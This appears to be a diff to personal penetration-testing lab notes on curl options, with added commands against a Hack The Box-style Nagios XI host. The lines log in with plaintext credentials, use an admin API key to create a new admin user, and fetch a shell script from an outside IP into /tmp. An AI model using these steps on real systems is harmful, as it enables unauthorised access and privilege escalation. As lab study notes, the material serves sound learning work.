@@ -101,9 +101,15 @@ When you use chmod -R,(Recursive)
 Recursive means it applies the specified changes not only to the given file or directory
 but also to all of its subdirectories and their contents.
 
-CURL command by using -L (redirect) and -H (use custom header), -k (or) --insecure (to neglect ssl certificate)
+CURL command by using -L (redirect) and -H (use custom header), -k (or) --insecure (to neglect ssl certificate),-d (HTTP data)
 #curl http://10.10.249.163/ -H "User-Agent: C" -L
 #curl --insecure https://bizness.htb | grep href
+#curl -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k -L -d "username=svc&password="XjH7VCehowpR1xZB"
+
+Using admin api-key to create new admin-user account
+-----------------------------------------------------
+curl -POST -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" 
+-d "username=secjedi&password=secjedi&name=secjedi&email=secjedi@monitored.htb&auth_level=admin"
 
 curl can also be used as wget 
 #curl 10.4.52.17/shell.sh -o /tmp/shell.sh
